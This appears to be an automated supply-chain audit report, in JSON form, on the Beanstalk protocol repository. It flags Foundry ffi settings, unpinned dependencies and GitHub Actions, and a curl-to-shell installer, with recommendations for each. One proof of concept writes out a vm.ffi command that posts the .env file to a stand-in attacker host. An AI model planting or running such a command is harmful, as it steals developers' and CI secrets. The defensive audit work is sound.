@@ -1,0 +1,170 @@
+{
+  "agent": "supply_chain_check",
+  "contract": "contracts/2024-05-beanstalk-the-finale/protocol",
+  "timestamp": "2026-05-28T23:27:40Z",
+  "findings": [
+    {
+      "id": "SC-001",
+      "title": "foundry.toml sets ffi = true with shell hooks (arbitrary build-time exec)",
+      "severity": "Critical",
+      "vuln_type": "other",
+      "description": "protocol/foundry.toml line 33 sets `ffi = true` in [profile.default]. The Foundry FFI cheatcode lets any test or build helper invoke arbitrary shell commands on the build machine via `vm.ffi(...)`. The repository also ships executable shell scripts (.husky/pre-commit, post-commit, post-update, pre-push) and npm/yarn lifecycle scripts (root package.json `bootstrap`/`generate`/`build`, protocol package.json `generate`/`test`), so the host environment that runs the build already executes project-controlled scripts. Combined with broad `fs_permissions` granting read access to the entire parent directory (`{ access = \"read\", path = \"../\" }`), a compromised dependency or test helper that reaches an ffi call can read source/secrets and execute commands. Per the patient-zero threat model, the capability itself is the finding: a single tampered test or library file under contracts/test compiled with this profile can run shell commands during `forge test`/`forge build` on a developer or CI machine, before any auditor sees final bytecode. The [profile.audit] profile does NOT carry ffi, but the default profile (used for normal builds/tests) does.",
+      "location": {
+        "file": "contracts/2024-05-beanstalk-the-finale/protocol/foundry.toml",
+        "function": "build_config",
+        "line_start": 33,
+        "line_end": 37,
+        "code_snippet": "ffi = true\nfs_permissions = [\n  { access = \"read\", path = \"../\"},\n  { access = \"read\", path = \"./out\" }\n]"
+      },
+      "impact": "A tampered dependency or test/build helper can execute arbitrary shell commands on developer/CI machines during `forge test` or `forge build` under the default profile, enabling secret exfiltration (the FORKING_RPC / ANVIL_FORK_URL secret, deployer keys in .env) or injection of code into build artifacts before review.",
+      "proof_of_concept": "Any Solidity file compiled under [profile.default] can call `string[] memory cmd = new string[](3); cmd[0] = \"bash\"; cmd[1] = \"-c\"; cmd[2] = \"curl attacker.tld -d @../protocol/.env\"; vm.ffi(cmd);`. Because ffi=true is set globally for the default profile, no per-test opt-in is required.",
+      "recommendation": "Set `ffi = false` in [profile.default]; only enable ffi in a dedicated, clearly named profile that is never the default and is used solely for the specific tests that require it. Tighten `fs_permissions` to the minimal directories actually needed instead of `../`. Document which tests legitimately require ffi and review them line by line.",
+      "confidence": "High",
+      "human_review_required": true,
+      "human_review_reason": "Supply chain finding (SC-*). The ffi capability is unambiguous, but whether any shipped test/helper actually abuses it, and the operational risk of removing it, require human judgment about developer intent and CI configuration.",
+      "ice_chain": {
+        "corrupted_state": "build host shell / build artifacts (off-chain)",
+        "consumer_found": true,
+        "consumer_function": "forge test / forge build (default profile)",
+        "consumer_action": "executes arbitrary shell commands via vm.ffi during compilation/testing",
+        "severity_ceiling": "Critical",
+        "search_method": "static_search"
+      }
+    },
+    {
+      "id": "SC-002",
+      "title": "Uniswap deps resolve to git branch #0.8, not pinned commits",
+      "severity": "High",
+      "vuln_type": "other",
+      "description": "protocol/package.json lists two production dependencies as git URLs pinned to a moving branch ref rather than an immutable commit:\n  - \"@uniswap/v3-core\": \"https://github.com/Uniswap/v3-core.git#0.8\"\n  - \"@uniswap/v3-periphery\": \"https://github.com/Uniswap/v3-periphery#0.8\"\nThe `#0.8` suffix is a branch (not a tag and not a 40-char commit SHA). Any force-push or new commit to the `0.8` branch of those repos changes what gets installed on the next clean `yarn install` for anyone not protected by the lockfile. `@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol` is imported into production Beanstalk oracle code (LibUniswapOracle / oracle path), so a change to that branch flows directly into compiled protocol bytecode. While yarn.lock currently freezes a resolution, branch-based git deps are non-reproducible by design and bypass npm registry integrity/scanning. This is the classic patient-zero vector: upstream-branch tampering reaches a fresh build before review.",
+      "location": {
+        "file": "contracts/2024-05-beanstalk-the-finale/protocol/package.json",
+        "function": "build_config",
+        "line_start": 53,
+        "line_end": 54,
+        "code_snippet": "\"@uniswap/v3-core\": \"https://github.com/Uniswap/v3-core.git#0.8\",\n\"@uniswap/v3-periphery\": \"https://github.com/Uniswap/v3-periphery#0.8\","
+      },
+      "impact": "A compromise or force-push of the Uniswap `0.8` branch (or a maintainer-account takeover) silently changes the OracleLibrary / TWAP math compiled into Beanstalk on the next clean install, potentially altering on-chain price logic that the protocol depends on for oracle reads.",
+      "recommendation": "Pin both Uniswap dependencies to a full 40-character commit SHA (e.g. `Uniswap/v3-core#<sha>`) or to a published, immutable npm release of @uniswap/v3-core / @uniswap/v3-periphery. Verify yarn.lock contains a git commit hash, not a branch resolution, and treat lockfile changes to these entries as security-relevant in review.",
+      "confidence": "High",
+      "human_review_required": true,
+      "human_review_reason": "Supply chain finding (SC-*). Whether the lockfile adequately freezes the branch resolution for the actual build process, and whether OracleLibrary is in audit scope, require human verification.",
+      "ice_chain": {
+        "corrupted_state": "@uniswap/v3-periphery OracleLibrary source consumed by Beanstalk oracle code",
+        "consumer_found": true,
+        "consumer_function": "LibUniswapOracle / oracle price read path",
+        "consumer_action": "compiles upstream branch code into deployed price logic",
+        "severity_ceiling": "High",
+        "search_method": "static_search"
+      }
+    },
+    {
+      "id": "SC-003",
+      "title": "GitHub Actions pinned to moving tags, not commit SHAs (incl. third-party)",
+      "severity": "High",
+      "vuln_type": "other",
+      "description": "Every action reference under .github/workflows/ is pinned to a moving major/minor tag rather than a full commit SHA. First-party actions use `actions/checkout@v3`, `actions/setup-node@v3`, `actions/cache@v3` (and `@v2` in main.off). More importantly, two third-party actions are referenced by movable tag:\n  - `stefanzweifel/git-auto-commit-action@v4` (ci.protocol.yaml) — this action runs with write access and commits to the PR branch.\n  - `mskri/check-uncommitted-changes-action@v1.0.1` (the four subgraph workflows).\nTags can be repointed by the action author (or by an attacker who compromises the action's repo). The git-auto-commit action in particular has `contents: write` semantics and pushes commits to `${{ github.head_ref }}`, so a malicious update to that tag could inject commits or run arbitrary code in CI. This is an unsigned/unpinned-Actions supply-chain exposure per the patient-zero model.",
+      "location": {
+        "file": "contracts/2024-05-beanstalk-the-finale/.github/workflows/ci.protocol.yaml",
+        "function": "build_config",
+        "line_start": 23,
+        "line_end": 26,
+        "code_snippet": "- name: Commit changes\n  uses: stefanzweifel/git-auto-commit-action@v4\n  with:\n    commit_message: prettier auto formatting changes\n    branch: ${{ github.head_ref }}"
+      },
+      "impact": "If a referenced action's tag is repointed to malicious code (author compromise or tag mutation), CI runs attacker-controlled code with repository write permissions and access to CI secrets (ANVIL_FORK_URL / FORKING_RPC), enabling commit injection into PR branches and secret theft.",
+      "recommendation": "Pin all actions — first-party and especially third-party — to a full commit SHA (e.g. `actions/checkout@<40-char-sha>`, `stefanzweifel/git-auto-commit-action@<sha>`). Add a comment with the human-readable tag next to each SHA. Restrict workflow `permissions:` to least privilege and scope the git-auto-commit step to the minimum needed.",
+      "confidence": "High",
+      "human_review_required": true,
+      "human_review_reason": "Supply chain finding (SC-*). Acceptable-risk assessment for first-party GitHub actions vs. third-party write-capable actions, and CI threat model, require human judgment.",
+      "ice_chain": {
+        "corrupted_state": "CI runner environment and PR branch contents",
+        "consumer_found": true,
+        "consumer_function": "GitHub Actions CI (format/test jobs)",
+        "consumer_action": "executes action code with repo write access and secret access",
+        "severity_ceiling": "High",
+        "search_method": "static_search"
+      }
+    },
+    {
+      "id": "SC-004",
+      "title": "CI pipes remote installer to shell: curl https://sh.rustup.rs | sh",
+      "severity": "High",
+      "vuln_type": "other",
+      "description": "Three workflows install Rust by piping a remote script straight into a shell with no integrity verification:\n  - .github/workflows/ci.sdk.yaml line 28\n  - .github/workflows/ci.sdk-core.yaml line 28\n  - .github/workflows/ci.sdk-wells.yaml line 30\nEach runs `curl https://sh.rustup.rs -sSf | sh -s -- -y`. The fetched content is executed unconditionally; there is no checksum, signature, or version pin on the installer. If sh.rustup.rs (or a CDN/TLS-MITM path) serves tampered content, arbitrary code runs on the CI runner with access to repository secrets. These jobs also run `yarn build` / `yarn anvil4tests`, so a poisoned toolchain step can taint downstream build artifacts. This matches the agent rule: `curl` piped to `sh` is a remote-code-execution build pattern.",
+      "location": {
+        "file": "contracts/2024-05-beanstalk-the-finale/.github/workflows/ci.sdk.yaml",
+        "function": "build_config",
+        "line_start": 27,
+        "line_end": 28,
+        "code_snippet": "- name: Install Rust (Stable)\n  run: curl https://sh.rustup.rs -sSf | sh -s -- -y"
+      },
+      "impact": "A compromised or MITM'd rustup installer executes arbitrary code on the CI runner, with access to CI secrets (FORKING_RPC / ANVIL_FORK_URL) and the ability to inject code into build outputs produced later in the same job.",
+      "recommendation": "Prefer the maintained `actions/setup-rust` / `dtolnay/rust-toolchain` action pinned to a commit SHA, or download the rustup-init binary and verify its published SHA-256 before execution rather than piping curl output directly into a shell.",
+      "confidence": "High",
+      "human_review_required": true,
+      "human_review_reason": "Supply chain finding (SC-*). These jobs are for SDK projects rather than the on-chain protocol; human should judge whether they share secrets/artifacts with protocol builds and the real exposure.",
+      "ice_chain": {
+        "corrupted_state": "CI runner environment (SDK jobs)",
+        "consumer_found": true,
+        "consumer_function": "GitHub Actions SDK CI jobs",
+        "consumer_action": "executes remote installer script unverified, then runs yarn build",
+        "severity_ceiling": "High",
+        "search_method": "static_search"
+      }
+    },
+    {
+      "id": "SC-005",
+      "title": "forge-std submodule and several deps lack immutable pins",
+      "severity": "Medium",
+      "vuln_type": "other",
+      "description": "Multiple dependencies are not pinned to immutable, verifiable references:\n  - .gitmodules declares the forge-std submodule with `url = https://github.com/foundry-rs/forge-std` and NO `branch =` directive. The working tree has forge-std checked out at commit b3bc8b1 (\"Update CODEOWNERS #866\"), which `git tag --points-at HEAD` shows is NOT a release tag. forge-std is also listed in protocol/package.json as `\"forge-std\": \"^1.1.2\"` (caret = floating minor/patch), so the test library is sourced two ways with neither pinned to a verified release tag.\n  - protocol/package.json `\"@beanstalk/wells1.1\": \"npm:@beanstalk/wells@1.1.0-prerelease0\"` resolves to a PRERELEASE build, and `@wells/` is remapped into production Solidity via remappings.txt (`@wells/=node_modules/@beanstalk/wells1.1/`). Prerelease artifacts are mutable/unstable and are imported into compiled contracts.\n  - protocol/package.json `\"@prb/math\": \"v2.5.0\"` uses a `v`-prefixed tag string (works, but is a tag rather than a registry semver pin and `@prb/math/contracts/PRBMath.sol` is imported into production code).\nNone of these is from an untrusted source, so this is Medium (loose pin on otherwise-trusted libraries), but each weakens build reproducibility and lets an upstream change reach a fresh build.",
+      "location": {
+        "file": "contracts/2024-05-beanstalk-the-finale/.gitmodules",
+        "function": "build_config",
+        "line_start": 1,
+        "line_end": 3,
+        "code_snippet": "[submodule \"protocol/lib/forge-std\"]\n\tpath = protocol/lib/forge-std\n\turl = https://github.com/foundry-rs/forge-std"
+      },
+      "impact": "Builds are not byte-reproducible from source control alone: a fresh clone + install can pick up a different forge-std commit, a re-published wells prerelease, or a moved @prb/math tag. forge-std is test-only (lower runtime risk), but @wells and @prb/math compile into production bytecode, so an upstream change there silently alters deployed code.",
+      "recommendation": "Add an explicit pinned commit for the forge-std submodule (commit the gitlink and, ideally, a `branch =` or document the exact SHA) and a verified release tag (e.g. v1.x.y) rather than a floating CODEOWNERS commit. Replace `^1.1.2` with an exact version. Pin `@beanstalk/wells1.1` to a stable, immutable release instead of `-prerelease0`. Pin `@prb/math` to an exact registry version. Verify yarn.lock freezes all of these to content hashes.",
+      "confidence": "High",
+      "human_review_required": true,
+      "human_review_reason": "Supply chain finding (SC-*). forge-std is test-only and @beanstalk/wells is a first-party org package; human should weigh actual risk of the prerelease pin and whether the wells code is in audit scope.",
+      "ice_chain": {
+        "corrupted_state": "forge-std / @beanstalk/wells / @prb/math source pulled at install time",
+        "consumer_found": true,
+        "consumer_function": "forge build (lib import) and Solidity imports of @wells/ and @prb/math",
+        "consumer_action": "compiles unpinned upstream code into test harness and production bytecode",
+        "severity_ceiling": "Medium",
+        "search_method": "static_search"
+      }
+    },
+    {
+      "id": "SC-006",
+      "title": "Ambiguous bare 'uniswap@^0.0.1' npm dep (dependency-confusion vector)",
+      "severity": "Medium",
+      "vuln_type": "other",
+      "description": "protocol/package.json dependencies include a bare, near-empty package `\"uniswap\": \"^0.0.1\"` (line 66) sitting next to the legitimately-scoped `@uniswap/v3-core` and `@uniswap/v3-periphery` git deps. The unscoped `uniswap` package on the public registry is a 0.0.x placeholder with no meaningful code and no relationship to Uniswap Labs' scoped packages. Having an unscoped, sub-1.0, caret-ranged dependency named after a major protocol is a dependency-confusion / namespace-ambiguity signal: it is not the package the protocol actually needs (the real code comes from the `@uniswap/*` scope), it serves no clear purpose, and a `^0.0.1` range plus a placeholder package is exactly the kind of low-trust entry an attacker could later co-opt or that could shadow an intended internal name. No malicious behavior is confirmed in the pinned resolution; this is flagged as an ambiguous/low-trust dependency requiring human disposition (remove if unused).",
+      "location": {
+        "file": "contracts/2024-05-beanstalk-the-finale/protocol/package.json",
+        "function": "build_config",
+        "line_start": 66,
+        "line_end": 66,
+        "code_snippet": "\"uniswap\": \"^0.0.1\""
+      },
+      "impact": "An unused, unscoped placeholder package with a floating sub-1.0 range increases the dependency attack surface (dependency confusion / future package takeover) without providing functionality; if it ever resolves to attacker-controlled content it executes within the install/build of the protocol package.",
+      "recommendation": "Remove the bare `uniswap` dependency if it is unused (the protocol imports `@uniswap/v3-core` / `@uniswap/v3-periphery`, not `uniswap`). If something genuinely requires it, pin it to an exact, audited version and document why it is needed.",
+      "confidence": "Medium",
+      "human_review_required": true,
+      "human_review_reason": "Supply chain finding (SC-*). Cannot confirm from source whether `uniswap` is actually used anywhere; human must verify it is dead weight before removal and assess registry-takeover risk.",
+      "ice_chain": {
+        "corrupted_state": "node_modules/uniswap install-time scripts (off-chain)",
+        "consumer_found": false,
+        "consumer_function": "yarn install lifecycle for @beanstalk/protocol",
+        "consumer_action": "installs an ambiguous placeholder package with a floating range",
+        "severity_ceiling": "Medium",
+        "search_method": "static_search"
+      }
+    }
+  ]
+}
